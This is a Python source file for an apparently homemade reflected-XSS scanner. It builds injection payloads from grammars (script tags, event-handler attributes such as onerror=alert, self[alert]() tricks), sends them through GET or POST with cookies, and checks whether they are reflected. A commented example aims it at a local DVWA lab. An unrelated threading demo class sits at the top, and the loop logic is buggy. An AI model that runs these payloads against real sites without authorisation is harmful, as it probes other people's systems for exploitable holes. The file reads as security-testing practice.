import threading

from a import simple_grammar_fuzzer
from connect import connect


class x:
    def multiplication(self, num): 
        print("Multiplication: {}".format(num * num))
        for i in range(3):
            self.addition(num)
    def addition(self,num): 
        print("Addition: {}".format(num + num))
        for i in range(3):
            self.division(num)
    def division(self,num):
        print("Division: {}".format(num / num))
    def substraction(self,num):
        print("substraction: {}".format(num - num))
    def xx(self):  
        t1 = threading.Thread(target=self.multiplication, args=(20,)) 
        t2 = threading.Thread(target=self.addition, args=(5,))  
        t3 = threading.Thread(target=self.division, args=(100,))
        t4 = threading.Thread(target=self.substraction, args=(3,))
        t1.start()  
        t2.start() 
        t3.start()
        t4.start()
        t1.join() 
        t2.join()
        t3.join()
        t4.join()



class xssPayload:

    def __init__(self):
        self.payloads = set()
        self.detect = "111111111111111"
    
    def generator(self, GRAMMAR):
        return set([simple_grammar_fuzzer(GRAMMAR, "@", "@") for i in range(50)])


    # payload formmat: "><script>alert(1)</script>
    def generator_xss_1(self):
        XSS_PAYLOAD1 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@specialCharacter@<script>@command@</script>"],
            "@quote@" : ["\"", "'"],
            "@specialCharacter@" : [">"],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD1)

    
    def generator_xss_4(self):
        XSS_PAYLOAD4 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@tag@@src@@space@@event@@quote@@command@@quote@@endtag@"],
            "@tag@" : ["<a ", "<img ", "<iframe ", "<div "],
            "@src@" : ["src=hihi ", "href=hihi "],
            "@quote@" : ["\"", "'"],
            "@space@" : ["", " "],
            "@endtag@" : [">"],
            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD4)

    #payload format: " onload="javascript:alert(1)"
    def generator_xss_2(self):
        XSS_PAYLOAD2 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@quote@@space@@event@@command@@quote@"],
            "@quote@" : ["\"", "'"],
            "@space@" : ["", " "],
            "@event@" : ["onunload=", "onscroll=", "onfocus=", "onclick=", "onmouseover=", "onmouseout=", "onload=", "onerror=" , "onresize=", "onrropertychange=", "onpagehide="],
            "@command@" : ["alert(111111111111111)", "prompt(111111111111111)", "document.write(111111111111111)", "console.log(111111111111111)"]
        }
        return self.generator(XSS_PAYLOAD2 )

    #payload include global variable like: self, ...
    def generator_xss_3(self):
        XSS_PAYLOAD3 = {
            "@start@" : ["@payload@"],
            "@payload@" : ["@global@[@command@](@value@)"],
            "@global@" : ["self"],
            "@command@" : ["alert", "prompt"],
            "@value@" : ["111111111111111"]
        
        }
        return self.generator(XSS_PAYLOAD3)

    

    def scan(self, url, params, cookie, method): #link, method):
        import random
        from bs4 import BeautifulSoup as bs
        import time
        
        
        self.payloads.update(self.generator_xss_1())
        self.payloads.update(self.generator_xss_4())
        self.payloads.update(self.generator_xss_3())
        self.payloads.update(self.generator_xss_2())
        payloads = list(self.payloads)
        


        check = 0
        listPayload = []
        source = None
        j = 10
        conn = connect()
        for i in payloads:
            x = random.randrange(0, len(payloads))
            if j == 0:
                break 
            # get ramdomly payload from list payload
            if i not in listPayload:
                listPayload.append(payloads[j])

                #source = conn.normal_POST(url, params="text", payload="\"><script>alert(1)</script>")
                # give up post method, because xss via post method not damage much to web site. 
                if method == "GET" or method == "get":
                    source = conn.gett(url,params, payloads[x], cookie)
                elif method == "POST" or method == "post":
                    source = conn.postt(url, params, payloads[x],cookie)
                if source == None:
                    continue
                

                if payloads[x] in str(source[0].content):
                    check = 1          #--------------------> Có lỗi

            j = j - 1
            if check == 1:
                print("XSS: " + url)
                break
        if check == 0:
            print("[+] " + url + " is not vulnerable to XSS")



    
'''

a = xssPayload()
cookie = {"PHPSESSID" : "f2c280e624310d43cafd4cebf90a1768", "security": "low"} 
print(a.scan("http://localhost/dvwa/vulnerabilities/xss_r/", ["name"],cookie, "post") )
'''